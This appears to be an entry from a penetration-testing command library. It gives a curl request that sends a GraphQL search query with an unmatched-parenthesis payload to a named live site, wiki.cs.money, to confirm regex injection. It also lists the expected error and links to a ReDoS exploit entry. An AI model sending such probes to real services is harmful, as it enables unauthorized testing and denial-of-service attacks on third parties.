---
data: >-
  curl 'https://wiki.cs.money/graphql' -H 'user-agent: Mozilla/5.0 (Windows NT
  10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121
  Safari/537.36' -H 'content-type: application/json' -H 'accept: */*'
  --data-binary '{"query":"query { search(q: \"\\u0000)\", lang: \"en\") { _id
  weapon_id rarity collection{ _id name } collection_id } }"}' --compressed
tags:
  - regex
  - confirm
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:25:53.206Z'
id: 4e1fd8f8-ae8f-4849-bb74-380bd08bb58b
verified: false
validated: true
submitted: true
---
# confirm-mismatched-regex

## Command

```bash
curl 'https://wiki.cs.money/graphql' -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36' -H 'content-type: application/json' -H 'accept: */*' --data-binary '{"query":"query { search(q: \"\\u0000)\", lang: \"en\") { _id weapon_id rarity collection{ _id name } collection_id } }"}' --compressed
```

## Description

Confirms regex usage by sending a payload that causes a syntax mismatch error.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--data-binary` | Payload with mismatched parens | Yes |
| `-H` flags | Standard headers | Yes |

## Examples

### Basic Usage

```bash
curl 'https://wiki.cs.money/graphql' -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36' -H 'content-type: application/json' -H 'accept: */*' --data-binary '{"query":"query { search(q: \"\\u0000)\", lang: \"en\") { _id weapon_id rarity collection{ _id name } collection_id } }"}' --compressed
```

## Expected Output

'Invalid regular expression: /(?=.*X))/: Unmatched ')' '.

## Related

- [[commands/exploit-single-redos]]
- [[procedures/Confirm-Regex-with-Mismatched-Pattern]]
